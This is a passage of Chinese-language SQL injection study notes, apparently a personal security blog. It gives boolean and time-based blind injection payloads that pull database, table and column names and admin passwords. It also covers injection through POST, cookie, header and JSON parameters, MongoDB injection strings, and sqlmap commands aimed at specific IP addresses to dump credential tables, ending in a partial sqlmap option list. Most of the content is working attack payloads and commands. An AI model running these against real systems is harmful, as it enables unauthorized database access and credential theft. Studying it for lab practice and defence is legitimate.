title="基于布尔的SQL盲注（其次）"></a>基于布尔的SQL盲注（其次）</h4><p>逻辑判断，regexp正则表达式，like，ascii，left，ord返回字符串第一个字符的ascii码，mid取字符串子串。</p><p>布尔型盲注是指注入页面中没有直接显示数据内容，但会显示输出的结果对还是错，查询的数据有还是没有。</p><ul><li><p><strong>猜解数据库长度</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or length(database()) &gt; 8 --+    # 符合条件返回正确，反之返回错误</span><br></pre></td></tr></table></figure></li><li><p><strong>猜解数据库名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or mid(database(),1,1)=&#x27;z&#x27; --+</span><br><span class="line">&#x27;or ORD(mid(database(),1,1)) &gt; 100 --+ :  # 因为需要验证的字符太多，所以可以转化为ascii码验证</span><br></pre></td></tr></table></figure></li><li><p><strong>猜解表的总数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 2  --+   # 判断表的总数</span><br></pre></td></tr></table></figure></li><li><p><strong>猜解各个表名的长度</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) = 5 --+</span><br><span class="line">&#x27;or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1) = 5 --+ （第二个表）</span><br></pre></td></tr></table></figure></li><li><p><strong>猜解第一个表名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1),1,1) = &#x27;a&#x27;  --+</span><br><span class="line">或者</span><br><span class="line">&#x27;rr ord(mid(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1),1,1)) &gt;100  --+</span><br></pre></td></tr></table></figure></li><li><p><strong>猜解表的字段的总数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;表名&#x27; limit 0,1) = 10 --+</span><br><span class="line">&#x27;or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;表名&#x27; limit 1,1) = 10 --+ （第二个字段）</span><br></pre></td></tr></table></figure></li><li><p><strong>猜解第一个字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = &#x27;表名&#x27; limit 0,1),1,1) = &#x27;i&#x27; --+</span><br><span class="line">或者</span><br><span class="line">&#x27;or ORD(mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = &#x27;表名&#x27; limit 0,1),1,1)) &gt; 100 --+</span><br><span class="line">或者直接猜解</span><br><span class="line">&#x27; or (select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;表名&#x27; limit 1,1) = &#x27;username&#x27; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>猜解内容长度</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">假如已经知道字段名为  id   username password</span><br><span class="line">&#x27;or (select Length(concat(username,&quot;---&quot;,password)) from admin limit 0,1) = 16  --+</span><br></pre></td></tr></table></figure></li><li><p><strong>猜解内容</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or mid((select concat(username,&quot;-----&quot;,password) from admin limit 0,1),1,1) = &#x27;a&#x27; --+</span><br><span class="line">或者</span><br><span class="line">&#x27;or ORD(mid((select concat(username,&quot;-----&quot;,password) from admin limit 0,1),1,1)) &gt; 100 --+    ASCII码猜解</span><br><span class="line">或者直接猜解</span><br><span class="line">&#x27;or (Select concat(username,&quot;-----&quot;,password) from admin limit 0,1 ) = &#x27;admin-----123456&#x27;   --+</span><br></pre></td></tr></table></figure></li></ul><h4 id="基于时间的SQL盲注（最后考虑）"><a href="#基于时间的SQL盲注（最后考虑）" class="headerlink" title="基于时间的SQL盲注（最后考虑）"></a>基于时间的SQL盲注（最后考虑）</h4><p>对于某些 SQL 注入页面，可能页面中任何信息都不返回，甚至连记录是否存在都不告诉你，这时布尔型盲注也就无效了。但是基于 <code>sleep()</code> 、<code>benchmark()</code>函数可以实现延时查询，我们可以构造一个判断语法，如果返回结果为真，则延时 5 秒再进行查询操作。那么我们就可以通过观察提交 SQL 注入语句后，页面响应是否有延时卡顿，来判断我们构造的 SQL 语句是否成立。</p><p>延时判断，if、sleep。</p><ul><li><p>if(expr1, expr2,expr3)</p><p>如果expr1是TRUE，则IF0的返回值为expr2;否则返回值则为expr3。if()的返回值为数字值或字符串值。具体情况视其所在语境而定。</p><p>若数据库名为a，则回显123，否则回显456：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727200138619.png" alt="image-20220727200138619"></p></li><li><p>if + sleep</p><p>若数据库名为a，则延时1s，否则不延时。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727200249771.png" alt="image-20220727200249771"></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 猜解数据库名长度，猜中了延时5s</span><br><span class="line">id=1 and sleep(if(length(database())=8,5,0))--+</span><br><span class="line"></span><br><span class="line">// 逐个猜解数据库名，猜中了延时5s</span><br><span class="line">id=1 and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+</span><br><span class="line"></span><br><span class="line">// 逐个猜解表名，猜中了延时5s</span><br><span class="line">id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0)--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">like &#x27;ro%&#x27;# 判断ro或ro...是否成立</span><br><span class="line">regexp &#x27;^xiaodi[a-z]&#x27;# 匹配xiaodi及xiaodi...等if(条件,5,0)</span><br><span class="line">ord()                           # 转换成ascii码</span><br><span class="line">mid (a, b, c)# 从位置b开始，截取a字符串的c个字符</span><br><span class="line">substr(a, b, c)# 与mid函数一样，从b位置开始，截取字符串a的c长度</span><br><span class="line">left (database(),1), database() # left(a,b)从左侧截取a的前b位</span><br><span class="line">length(database())=8    # 判断数据库database()名的长度</span><br><span class="line">ord=ascii ascii(x)=97 # 判断x的ascii码是否等于97</span><br></pre></td></tr></table></figure><p><strong>盲注的加速方法</strong>：</p><p>减少查询次数，提高查找的正确率。</p><ul><li><p><strong>二分法</strong>爆破字符；</p></li><li><p><strong>位运算法</strong></p><p>每次查询确定一位，这样一个字符只需要8次就可以确定了，利用位运算符&amp;实现取某一位的值。</p></li></ul><h3 id="按照注入的数据类型"><a href="#按照注入的数据类型" class="headerlink" title="按照注入的数据类型"></a>按照注入的数据类型</h3><h4 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h4><p>现有的查询语句 Where 筛选条件匹配的字段是数值类型。构造注入语句时不需要单引号和#来闭合语法。</p><h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><p>现有的查询语句 Where 筛选条件匹配的字段是字符型。一般字符型注入需要构造单引号&#x2F;双引号用于闭合语法，还需要加入注释符使原本的引号以及后面的语句无效。</p><p><strong>除单引号外，SQL语句也有其他的一些干扰符号：’ “ % ) }等，具体需看写法。</strong></p><p>比如<code>select * from user where name like &#39;%xiaodi%&#39;;</code>用于搜索name字段中含有<code>xiaodi</code>的记录。或者<code>select * from user where name=(&#39;xiaodi&#39;);</code>增加了括号。</p><p>这时注入的话就要考虑%来闭合语法。实际中应该用什么符号来闭合语法需要自己尝试。</p><p>&#x3D;&#x3D;<strong>如何判断字符型、数字型</strong>&#x3D;&#x3D;</p><p>比如在文本框中输入 <code>1 and 1=1</code> 和 <code>1 and 1=2</code>，若都能返回数据（都通过），说明可能注入漏洞不是数字型，应该是字符型形式 ；因为对于字符型，使用<code>?id=1 and 1=1</code>相当于执行的是<code>SELECT * FROM users WHERE id=&#39;1 and 1=1&#39; LIMIT 0,1;</code>这样网站对于<code>&#39;1 and 1=1&#39;</code>或者<code>&#39;1 and 1=2&#39;</code>都是取前面的1，都返回数据。</p><p>此时在文本框输入 <code>1&#39; and 1=1#</code>，可以返回数据，输入 <code>1&#39; and 1=2#</code>，没有数据返回，说明注入成功，确认漏洞为<code>id=&#39;1&#39; and 1=1#&#39;</code>的字符型SQL注入；（注意：有时用于闭合语法的不一定为单引号，另外在mysql中一般注释后面的字句是采用的–+在有些的字句中采用#注释。需要多测试才能发现）</p><p>若在文本框中输入 <code>1 and 1=1</code> 和 <code>1 and 1=2</code>，前者返回数据，后者不返回，直接确定是 <code>id=1 and 1=1</code>的数值型形式。</p><h4 id="搜索型"><a href="#搜索型" class="headerlink" title="搜索型"></a>搜索型</h4><p>使用了<code>select * from users where id like &#39;%233&#39;</code>之类的模糊匹配，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">word=a%&#x27; and 1=1#     返回正确</span><br><span class="line">word=a%&#x27; and 1=2#     返回错误</span><br></pre></td></tr></table></figure><h3 id="按照提交参数方式"><a href="#按照提交参数方式" class="headerlink" title="按照提交参数方式"></a>按照提交参数方式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="variable">$get</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;g&#x27;</span>];    <span class="comment">//get接受参数名g的值赋值给变量get</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$get</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$post</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;p&#x27;</span>];  <span class="comment">//post接受参数名p的值赋值给变量post</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$post</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;c&#x27;</span>] ;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;r&#x27;</span>] ;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$r</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP USER AGENT&#x27;</span>];    <span class="comment">// php内置函数，用于获取一些参数信息</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727103622802.png" alt="image-20220727103622802" style="zoom:67%;"><h4 id="get数据注入"><a href="#get数据注入" class="headerlink" title="get数据注入"></a>get数据注入</h4><p>get数据的注入在前面已经详细说明。</p><h4 id="post数据注入"><a href="#post数据注入" class="headerlink" title="post数据注入"></a>post数据注入</h4><p>（sqlilabs less 11）</p><p>网站的URL不会显示具体的参数，而是将参数放在web表单中以post请求的形式提交。</p><p>此时需要使用 Burpsuite 等工具来构造 POST 包。BP抓包之后在数据包中进行相同的注入流程。</p><p>或者使用hackbar构造post数据也可。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/15617979867982.jpg" alt="img" style="zoom:33%;"><h4 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h4><p>（sqlilabs less 20）</p><p>有时网站对get、post请求都进行了关键词过滤，难以注入，但是忽略了cookie也可以传递参数。如果cookie的参数也被用于SQL语句，那么也有成功注入的可能。有时使用cookie传参时会与post冲突，此时可能需要改为使用GET请求。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727144345092.png" alt="image-20220727144345092"></p><h4 id="request请求注入"><a href="#request请求注入" class="headerlink" title="request请求注入"></a>request请求注入</h4><p>如果网站是request请求，那么可以在所有方法的位置提交，包括get、post、cookie。</p><p>下面的网站以get或post都能提交参数：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727105414609.png" alt="image-20220727105414609"></p><h4 id="SERVER注入"><a href="#SERVER注入" class="headerlink" title="$_SERVER注入"></a>$_SERVER注入</h4><p>php内置函数，用于获取一些参数信息。</p><p>$_SERVER详解：<a href="https://blog.csdn.net/lky_for_lucky/article/details/111300340">https://blog.csdn.net/lky_for_lucky/article/details/111300340</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&#x27;HTTP_ACCEPT_LANGUAGE&#x27;] //浏览器语言</span><br><span class="line">$_SERVER[&#x27;REMOTE_ADDR&#x27;] //当前用户IP</span><br><span class="line">$_SERVER[&#x27;REMOTE_HOST&#x27;] //当前用户[主机名]</span><br></pre></td></tr></table></figure><p>如果通过$_SERVER获取的信息被用于SQL语句，那么就可能存在注入漏洞。</p><p>比如BP抓包后，将浏览器信息User-Agent进行修改。如果网站将User-Agent字段作为SQL语句的参数，那就可能存在注入成功的可能。</p><h4 id="json数据注入"><a href="#json数据注入" class="headerlink" title="json数据注入"></a>json数据注入</h4><p>原理一样与其他注入一样，只是注入点改为json的键值对中的值。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1624337757521-14b7e701-9024-4ef6-9696-83c7fcef0409.png" alt="image.png" style="zoom:67%;"><h4 id="HTTP头部参数注入"><a href="#HTTP头部参数注入" class="headerlink" title="HTTP头部参数注入"></a>HTTP头部参数注入</h4><p>（sqlilabs less 18）</p><p>有些网站调用php的$_SERVER获取一些HTTP头部信息，比如User-Agent。这些地方可以进行注入。</p><p>还有X- Forwarded- For，简称XFF头，它代表客户端真实的IP。这里也可以尝试进行注入。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727145345768.png" alt="image-20220727145345768"></p><p>上例中的SQL语句为insert操作，无法像select一样回显信息，因此只能盲注。</p><h2 id="8-各种数据库注入"><a href="#8-各种数据库注入" class="headerlink" title="8. 各种数据库注入"></a>8. 各种数据库注入</h2><p><a href="https://blog.csdn.net/qq_42438245/article/details/121579063">https://blog.csdn.net/qq_42438245/article/details/121579063</a></p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727150100470.png" alt="image-20220727150100470" style="zoom:50%;"><p><strong>各种数据库的注入特点</strong></p><p>不同的数据库具有不同的注入特点，每个数据库支持的功能不一样，获取到的权限和可执行操作等不同。</p><p>包括access、mysql、mssql、mongoDB、postgresql、sqlite、oracle、sybase等。</p><h3 id="access注入（暴力）"><a href="#access注入（暴力）" class="headerlink" title="access注入（暴力）"></a>access注入（暴力）</h3><p>access数据库都是存放在网站目录下，后缀格式为 mdb，asp，asa，结构为表名&#x2F;列名&#x2F;数据，不同的网站会有各自的acess数据库。不会像mySQL那样一个网站的管理员可以操作多个mySQL数据库，导致存在跨库注入的情况。mySQL的结构为数据库名&#x2F;表名&#x2F;列名&#x2F;数据。</p><p>access没有information_ schema表，数据库名、操作系统等等都无法查询，<u>只能暴力猜解表名、列名、数据</u>，可以通过一些暴库手段、目录猜解等下载数据库。</p><ul><li><p>判断数据库类型</p><p>由于各个数据库特征不同，这里直接使用sqlmap比较方便：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727152142889.png" alt="image-20220727152142889"></p></li><li><p>判断注入点</p></li><li><p>猜解字段数量</p><p>oder by</p></li><li><p>判断哪几个位置回显</p><p><code>?id=-1 union select 1,2,3</code></p></li><li><p>暴力猜解表名、列名等信息</p><p>比如猜当前表为admin，看是否成功返回数据：</p><p><code>?id=-1 union select 1,2,3 from admin</code></p></li></ul><p>使用工具进行暴力猜解：</p><p>尝试爆表名：<code>sqlmap -u http://219.153.49.228:46617/new_list.asp?id=1 --tables</code> </p><p>尝试爆表admin的列名： <code>sqlmap -u http://219.153.49.228:46617/new_list.asp?id=1 --dump -T &quot;admin&quot;</code></p><h3 id="msSQL注入（pangolin穿山甲）"><a href="#msSQL注入（pangolin穿山甲）" class="headerlink" title="msSQL注入（pangolin穿山甲）"></a>msSQL注入（pangolin穿山甲）</h3><ul><li><p>判断数据库类型</p><p>由于各个数据库特征不同，这里直接使用pangolin穿山甲工具进行判断：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727153727547.png" alt="image-20220727153727547"></p><p>从工具中还可以看到不同数据库可以获得的权限，明显msSQL可以得到更多权限。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727154114341.png" alt="image-20220727154114341"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727154006163.png" alt="image-20220727154006163"></p><p>在信息一栏中可以查看到数据库的各种信息：版本、数据库名、计算机名、数据库名、管理员最高权限、Sql-server对应root （mysql）、数据库各表名、磁盘、用户组、用户等。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727154518550.png" alt="image-20220727154518550" style="zoom:50%;"><p>在获取数据一栏中可以获取数据库信息，表名数据等</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727154538662.png" alt="image-20220727154538662" style="zoom:50%;"></li><li><p>msSQL的手工注入</p><p>语句会与mySQL不同：</p><p><a href="https://www.cnblogs.com/wuhongbin/p/15582849.html">https://www.cnblogs.com/wuhongbin/p/15582849.html</a></p><p><a href="https://www.cnblogs.com/xishaonian/p/6173644.html">https://www.cnblogs.com/xishaonian/p/6173644.html</a></p></li></ul><h3 id="postgreSQL注入"><a href="#postgreSQL注入" class="headerlink" title="postgreSQL注入"></a>postgreSQL注入</h3><ul><li>可以使用工具：sqlmap、pangolin穿山甲</li></ul><p>识别数据库类型：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1</code></p><p>判断数据库权限：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -privileges --level 3</code></p><p>判断是否为数据库管理员：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 --is-dba --level 3</code></p><p>查看当前数据库：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 --current-db --batch</code></p><p>查看名为public的数据库的表名：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public --tables</code></p><p>查看表reg_users 的列名：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public -T reg_users --columns</code></p><p>查看表reg_users 的具体数据：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public -T reg_users -C &quot;name,password&quot; --dump --batch</code></p><ul><li><p>手工注入，某些语句会有差别：</p><p><a href="https://blog.csdn.net/hack8/article/details/6427911">https://blog.csdn.net/hack8/article/details/6427911</a></p><p><a href="https://www.cnblogs.com/yilishazi/p/14710349.html">https://www.cnblogs.com/yilishazi/p/14710349.html</a></p></li></ul><h3 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h3><ul><li><p>使用工具：sqlmap、pangolin穿山甲</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727162001437.png" alt="image-20220727162001437"></p></li><li><p>手工注入</p><p>参考文档：<a href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">https://www.cnblogs.com/peterpan0707007/p/8242119.html</a></p></li></ul><h3 id="mongoDB注入"><a href="#mongoDB注入" class="headerlink" title="mongoDB注入"></a>mongoDB注入</h3><ul><li><p>使用工具</p><p>SQLmap不能识别MongoDB，这里介绍nosqlattack：<a href="https://github.com/youngyangyang04/NoSQLAttack">https://github.com/youngyangyang04/NoSQLAttack</a></p><p>首先输入目标网站IP：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727164245044.png" alt="image-20220727164245044"></p><p>然后输入路径：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727164313282.png" alt="image-20220727164313282"></p><p>尝试攻击：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727164346561.png" alt="image-20220727164346561"></p></li><li><p>手工注入</p><p>参考文档：</p><p><a href="https://blog.csdn.net/qq_39936434/article/details/95319449">https://blog.csdn.net/qq_39936434/article/details/95319449</a></p><p><a href="https://www.cnblogs.com/wefeng/p/11503102.html">https://www.cnblogs.com/wefeng/p/11503102.html</a></p><p>Mongodb的查询文档方式与其他的数据库略微不同，当进行条件查询的时候，mysql是用where, 而mongodb是以键值对形式进行查询的。</p><p>比如按id&#x3D;”1”查询表news中的数据：<code>select * from admin &#123;&#39;id&#39;: &#39;1&#39;&#125;)</code>。</p><ul><li><p>构建回显，mongoDB查询操作的源代码为findone({‘id’：‘1’})</p><p>攻击语句：<code>/new_list.php?id=1&#39;&#125;);return(&#123;title:1,content:&#39;2</code></p><p><img src="https://i0.hdslb.com/bfs/article/4e7e306f459dea0d7e0f0f629cfc5164865c521c.png@831w_207h_progressive.webp" alt="img"></p></li><li><p>爆库</p><p><code>/new_list.php?id=1&#39;&#125;); return (&#123;title:tojson(db),content:&#39;1</code></p><p>—tojson() 方法可以将 Date 对象转换为字符串格式化为 JSON 数据格式，相当于MySQL的数据库名。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/58e82612a8625ea7cb239e0e56529d8b36c06def.png@831w_168h_progressive.webp" alt="img"></p></li><li><p>爆表</p><p><code>/new_list.php?id=1&#39;&#125;);return(&#123;title:tojson(db.getCollectionNames()),content:&#39;1</code> </p><p>db.getCollectionNames()返回的是数组，转化为json格式，相当于MySQL的tables。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/193beaae0edc48fde33c165acbb2ee1e430c4600.png@831w_210h_progressive.webp" alt="img"></p></li><li><p>查询指定数据</p><p><code>/new_list.php?id=1&#39;&#125;);return(&#123;title:tojson(db.Authority_confidential.find()[0]),content:&#39;1</code></p><p>元素集中查找使用E.find(expr)函数，用于从匹配的元素集E的子元素中找出与find指定表达式expr相匹配的元素集合，E 同 expr 可视作同父子元素关系.</p><p>find()[0]为第一条数据，find()[1]为第二条</p><p>由于是字典形式，所以键和值一起出来了，不需要额外查询列。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/7bd9545127c9714df2a53416d7caa935b305e196.png@831w_290h_progressive.webp" alt="img"></p></li></ul></li></ul><h2 id="9-sqlmap"><a href="#9-sqlmap" class="headerlink" title="9. sqlmap"></a>9. sqlmap</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">-u  #注入点 </span><br><span class="line">-f  #指纹判别数据库类型 </span><br><span class="line">-b  #获取数据库版本信息 </span><br><span class="line">-p  #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;) </span><br><span class="line">-D &quot;&quot;  #指定数据库名 </span><br><span class="line">-T &quot;&quot;  #指定表名 </span><br><span class="line">-C &quot;&quot;  #指定字段 </span><br><span class="line">-s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot;　　恢复:-s &quot;xx.log&quot; --resume) </span><br><span class="line">--level=(1-5) #要执行的测试水平等级，默认为1 </span><br><span class="line">--risk=(0-3)  #测试执行的风险等级，默认为1 </span><br><span class="line">--time-sec=(2,5) #延迟响应，默认为5 </span><br><span class="line">--data #通过POST发送数据 </span><br><span class="line">--columns        #列出字段 </span><br><span class="line">--current-user   #获取当前用户名称 </span><br><span class="line">--current-db     #获取当前数据库名称 </span><br><span class="line">--users          #列数据库所有用户 </span><br><span class="line">--passwords      #数据库用户所有密码 </span><br><span class="line">--privileges     #查看用户权限(--privileges -U root) </span><br><span class="line">-U               #指定数据库用户 </span><br><span class="line">--dbs            #列出所有数据库 </span><br><span class="line">--tables -D &quot;&quot;   #列出指定数据库中的表 </span><br><span class="line">--columns -T &quot;user&quot; -D &quot;mysql&quot;#列出mysql数据库中的user表的所有字段</span><br><span class="line">--dump-all            #列出所有数据库所有表 </span><br><span class="line">--exclude-sysdbs      #只列出用户自己新建的数据库和表 </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 </span><br><span class="line">--dbms    #指定数据库类型(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </span><br><span class="line">--os      #指定系统(Linux,Windows) </span><br><span class="line">-v  #详细的等级(0-6)     0：只显示Python的回溯，错误和关键消息。 </span><br><span class="line">    1：显示信息和警告消息。 </span><br><span class="line">    2：显示调试消息。 </span><br><span class="line">    3：有效载荷注入。 </span><br><span class="line">    4：显示HTTP请求。 </span><br><span class="line">    5：显示HTTP响应头。 </span><br><span class="line">    6：显示HTTP响应页面的内容 </span><br><span class="line">--privileges  #查看权限 </span><br><span class="line">--is-dba      #是否是数据库管理员 </span><br><span class="line">--roles       #枚举数据库用户角色 </span><br><span class="line">--udf-inject  #导入用户自定义函数（获取系统权限） </span><br><span class="line">--union-check  #是否支持union 注入 </span><br><span class="line">--union-cols #union 查询表记录 </span><br><span class="line">--union-test #union 语句测试 </span><br><span class="line">--union-use  #采用union 注入 </span><br><span class="line">--union-tech orderby #union配合order by </span><br><span class="line">--data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) </span><br><span class="line">--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) --referer 